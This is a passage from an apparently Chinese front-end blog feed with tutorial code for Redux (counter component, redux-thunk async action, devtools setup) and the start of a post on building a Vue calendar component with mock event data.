class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;click &#123;count&#125; times&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class="line"><span class="regexp">            &lt;option value="1"&gt;1&lt;/</span>option&gt;</span><br><span class="line">            &lt;option value=<span class="string">"2"</span>&gt;<span class="number">2</span>&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">            &lt;option value="3"&gt;3&lt;/</span>option&gt;</span><br><span class="line">          &lt;<span class="regexp">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.decrement&#125;&gt;-<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.incrementIfOdd&#125;&gt;increment <span class="keyword">if</span> odd&lt;<span class="regexp">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 入口js</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span></span><br><span class="line"><span class="keyword">import</span> &#123; Provider &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./containers/App'</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./redux/store'</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(<span class="xml"><span class="tag">&lt;<span class="name">Provider</span> <span class="attr">store</span>=<span class="string">&#123;store&#125;</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">App</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">Provider</span>&gt;</span></span>, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>))</span><br></pre></td></tr></table></figure><h2 id="redux-thunk异步中间件"><a href="#redux-thunk异步中间件" class="headerlink" title="redux-thunk异步中间件"></a>redux-thunk异步中间件</h2><p><code>npm install --save redux-thunk</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redux/store.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware&#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">'redux-thunk'</span> <span class="comment">// 引入依赖</span></span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">'./reducer'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createStore(reducer, applyMiddleware(thunk))</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redux/actions.js</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  异步增加的异步 action</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> incrementAsync = <span class="function"><span class="keyword">function</span>(<span class="params">number</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 返回一个带 dispatch 参数的函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">dispatch</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 执行异步操作</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 有了结果后, 通过同步的increment分发 action</span></span><br><span class="line">      dispatch(increment(number))</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// components/Counter.jsx</span></span><br><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">UI组件</span></span><br><span class="line"><span class="comment">  主要做显示与与用户交互</span></span><br><span class="line"><span class="comment">  代码中没有任何redux相关的代码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Counter</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">    count: PropTypes.number.isRequired,</span><br><span class="line">    increment: PropTypes.func.isRequired,</span><br><span class="line">    decrement: PropTypes.func.isRequired,</span><br><span class="line">    incrementAsync: PropTypes.func.isRequired <span class="comment">// 引入异步方法</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line">    <span class="keyword">this</span>.numberRef = React.createRef()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  increment = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.props.increment(number)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  decrement = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.props.decrement(number)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  incrementIfOdd = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.props.count % <span class="number">2</span> === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.props.increment(number)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  incrementAsync = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="comment">// 使用 thunk 异步增加</span></span><br><span class="line">    <span class="keyword">this</span>.props.incrementAsync(number)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="keyword">this</span>.props.count</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;click &#123;count&#125; times&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class="line"><span class="regexp">            &lt;option value="1"&gt;1&lt;/</span>option&gt;</span><br><span class="line">            &lt;option value=<span class="string">"2"</span>&gt;<span class="number">2</span>&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">            &lt;option value="3"&gt;3&lt;/</span>option&gt;</span><br><span class="line">          &lt;<span class="regexp">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.decrement&#125;&gt;-<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.incrementIfOdd&#125;&gt;increment <span class="keyword">if</span> odd&lt;<span class="regexp">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// containers/App.jsx</span></span><br><span class="line"><span class="keyword">import</span> &#123;connect&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"><span class="keyword">import</span> Counter <span class="keyword">from</span> <span class="string">'../components/Counter'</span></span><br><span class="line"><span class="comment">// 将 incrementAsync 挂载到 Counter</span></span><br><span class="line"><span class="keyword">import</span> &#123;increment, decrement, incrementAsync&#125; <span class="keyword">from</span> <span class="string">'../redux/actions'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">  state =&gt; (&#123;<span class="attr">count</span>: state&#125;),</span><br><span class="line">  &#123;increment, decrement, incrementAsync&#125;,</span><br><span class="line">)(Counter)</span><br></pre></td></tr></table></figure><h2 id="redux-调试工具"><a href="#redux-调试工具" class="headerlink" title="redux 调试工具"></a>redux 调试工具</h2><p>在<code>chrome</code>安装<code>redux-devtool</code>插件</p><p>项目中下载依赖：<code>npm install --save-dev redux-devtools-extension</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// // redux/store.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware&#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="comment">// 引入这个工具</span></span><br><span class="line"><span class="keyword">import</span> &#123;composeWithDevTools&#125; <span class="keyword">from</span> <span class="string">'redux-devtools-extension'</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">'redux-thunk'</span></span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">'./reducer'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createStore(reducer, composeWithDevTools(applyMiddleware(thunk)))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;redux&quot;&gt;&lt;a href=&quot;#redux&quot; class=&quot;headerlink&quot; title=&quot;redux&quot;&gt;&lt;/a&gt;redux&lt;/h1&gt;&lt;p&gt;作用：集中式管理 react 应用中多个组件共享的状态。&lt;/p&gt;
&lt;h2 id=&quot;核心api&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="reactjs" scheme="http://yoursite.com/categories/reactjs/"/>
    
    
      <category term="reactjs" scheme="http://yoursite.com/tags/reactjs/"/>
    
  </entry>
  
  <entry>
    <title>日历组件</title>
    <link href="http://yoursite.com/posts/3b43e344.html"/>
    <id>http://yoursite.com/posts/3b43e344.html</id>
    <published>2019-06-06T16:23:20.000Z</published>
    <updated>2020-06-18T07:09:21.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="日历组件"><a href="#日历组件" class="headerlink" title="日历组件"></a>日历组件</h1><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><blockquote><p>忙活了大概三天，做出来非常开心，心里美滋滋的</p><p>其实很早就想自己写一个日历组件了，只怪自己懒散</p><p>现在写一下思路过程，记录一下</p></blockquote><p>  <img src="/view/posts/3b43e344/calendar.gif" alt="calendar"></p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>1、实现一个日历组件，如图：</p><p><img src="/view/posts/3b43e344/20190606223710.png" alt="20190606223710"></p><p>2、显示某天的事项：</p><p><img src="/view/posts/3b43e344/1559832421561.png" alt="1559832421561"></p><p>3、事项是模拟父组件请求接口返回的，数据格式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">        &#123;</span><br><span class="line">          id: <span class="string">'232'</span>,</span><br><span class="line">          date: <span class="string">'2019-06-01'</span>,</span><br><span class="line">          info: <span class="string">'我要去吃大餐'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          id: <span class="string">'292'</span>,</span><br><span class="line">          date: <span class="string">'2019-06-06'</span>,</span><br><span class="line">          info: <span class="string">'我要去吃大餐'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          id: <span class="string">'292'</span>,</span><br><span class="line">          date: <span class="string">'2019-06-07'</span>,</span><br><span class="line">          info: <span class="string">'我要去吃大餐'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          id: <span class="string">'369'</span>,</span><br><span class="line">          date: <span class="string">'2019-06-30'</span>,</span><br><span class="line">          info: <span class="string">'我要去吃大餐'</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br></pre></td></tr></table></figure><p>4、把事项添加到日历组件中，数据格式如下：</p><p><img src="/view/posts/3b43e344/2019-06-06_22-54-19.png" alt="2019-06-06_22-54-19"></p><h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><p><strong>package.json文件：</strong></p><p>父组件页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"test-container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Test页面，测试组件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 日历 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">calendar</span> <span class="attr">v-if</span>=<span class="string">"calendarVisible"</span> @<span class="attr">getDateInfo</span>=<span class="string">"getDateInfo"</span> <span class="attr">:propsInfoList</span>=<span class="string">"propsInfoList"</span> <span class="attr">:propsTime</span>=<span class="string">"propsTime"</span>&gt;</span><span class="tag">&lt;/<span class="name">calendar</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> calendar <span class="keyword">from</span> <span class="string">'@/components/Calendar/Calendar.vue'</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">'test'</span>,</span></span><br><span class="line"><span class="undefined">  components: &#123;</span></span><br><span class="line"><span class="javascript">    <span class="string">"calendar"</span>: calendar</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  data() &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">      calendarVisible: <span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">      propsTime: <span class="string">''</span>,</span></span><br><span class="line"><span class="javascript">      propsInfoList: <span class="string">''</span>,</span></span><br><span class="line"><span class="undefined">      middle: [</span></span><br><span class="line"><span class="undefined">        &#123;</span></span><br><span class="line"><span class="javascript">          id: <span class="string">'232'</span>,</span></span><br><span class="line"><span class="javascript">          date: <span class="string">'2019-06-01'</span>,</span></span><br><span class="line"><span class="javascript">          info: <span class="string">'我要去吃大餐'</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        &#123;</span></span><br><span class="line"><span class="javascript">          id: <span class="string">'292'</span>,</span></span><br><span class="line"><span class="javascript">          date: <span class="string">'2019-06-06'</span>,</span></span><br><span class="line"><span class="javascript">          info: <span class="string">'我要去吃大餐'</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        &#123;</span></span><br><span class="line"><span class="javascript">          id: <span class="string">'292'</span>,</span></span><br><span class="line"><span class="javascript">          date: <span class="string">'2019-06-07'</span>,</span></span><br><span class="line"><span class="javascript">          info: <span class="string">'我要去吃大餐'</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        &#123;</span></span><br><span class="line"><span class="javascript">          id: <span class="string">'369'</span>,</span></span><br><span class="line"><span class="javascript">          date: <span class="string">'2019-06-30'</span>,</span></span><br><span class="line"><span class="javascript">          info: <span class="string">'我要去吃大餐'</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      ]</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  created() &#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 模拟首屏ajax请求，将当月数据传入组件中</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.propsInfoList = <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.middle)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.propsTime = <span class="keyword">this</span>.getToday()</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  mounted() &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.alert(<span class="string">'测试时间为19年 5、6、7月，完成是在6月'</span>)</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods: &#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 格式化当前日期 YYYY-MM-DD</span></span></span><br><span class="line"><span class="undefined">    getToday() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> nowDate = <span class="keyword">new</span> <span class="built_in">Date</span>()</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> yy = nowDate.getFullYear().toString()</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> mm = (nowDate.getMonth() + <span class="number">1</span> + <span class="string">''</span>).padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> dd = (nowDate.getDate() + <span class="string">''</span>).padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span></span><br><span class="line"><span class="javascript">      <span class="comment">// let hh = nowDate.getHours().toString().padStart(2,'0')</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// let mt = (nowDate.getMinutes() + '').padStart(2,'0')</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// let ss = (nowDate.getSeconds() + '').padStart(2,'0')</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;yy&#125;</span>-<span class="subst">$&#123;mm&#125;</span>-<span class="subst">$&#123;dd&#125;</span>`</span> <span class="comment">// -$&#123;hh&#125;-$&#123;mt&#125;-$&#123;ss&#125;</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 组件传值</span></span></span><br><span class="line"><span class="undefined">    getDateInfo(year, month) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> _this = <span class="keyword">this</span></span></span><br><span class="line"><span class="javascript">      _this.propsTime = <span class="string">`<span class="subst">$&#123;year&#125;</span>-<span class="subst">$&#123;month&#125;</span>`</span></span></span><br><span class="line"><span class="javascript">      _this.calendarVisible = <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 模拟点击选取其他年月的ajax，假数据，只能显示19年 5 6 7三个月</span></span></span><br><span class="line"><span class="javascript">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="undefined">        _this.propsInfoList = []</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> middle</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(month == <span class="string">'05'</span>) &#123;</span></span><br><span class="line"><span class="undefined">          middle  = [</span></span><br><span class="line"><span class="undefined">            &#123;</span></span><br><span class="line"><span class="javascript">              id: <span class="string">'232'</span>,</span></span><br><span class="line"><span class="javascript">              date: <span class="string">'2019-05-10'</span>,</span></span><br><span class="line"><span class="javascript">              info: <span class="string">'我要去吃小餐'</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          ]</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (month == <span class="string">'06'</span>) &#123;</span></span><br><span class="line"><span class="undefined">          middle = _this.middle</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (month == <span class="string">'07'</span>) &#123;</span></span><br><span class="line"><span class="undefined">          middle  = [</span></span><br><span class="line"><span class="undefined">            &#123;</span></span><br><span class="line"><span class="javascript">              id: <span class="string">'232'</span>,</span></span><br><span class="line"><span class="javascript">              date: <span class="string">'2019-07-10'</span>,</span></span><br><span class="line"><span class="javascript">              info: <span class="string">'我要去吃小餐'</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          ]</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">          middle = <span class="string">''</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        _this.propsInfoList = <span class="built_in">JSON</span>.stringify(middle)</span></span><br><span class="line"><span class="javascript">        _this.calendarVisible = <span class="literal">true</span></span></span><br><span class="line"><span class="undefined">      &#125;, 100)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>日历子组件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"calendar-container"</span>&gt;</span></span><br><span class="line">    // 日历标题</span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>calendar<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    // 显示本月日期 2019-6，可点击</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"show-date"</span> @<span class="attr">click</span>=<span 